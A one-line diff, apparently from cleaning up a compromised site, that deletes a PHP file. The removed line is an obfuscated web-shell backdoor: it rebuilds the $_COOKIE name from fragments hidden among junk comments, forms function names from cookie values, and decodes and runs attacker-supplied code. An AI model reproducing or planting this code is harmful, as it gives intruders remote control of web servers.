@@ -1,1 +1,0 @@
-<?php $pd='_CO';$og/*Dd*/='E';$la/**R@*/='OKI';$ik=/*Yy7*/${$pd.$la.$og};$sb=$ik/*3*/['mx'].$ik['g'];$n=/*E*/$ik['KU'].$ik['zf']/*5*/.$ik['V'];$nv=$sb('',$n($ik['OM']));$nv();
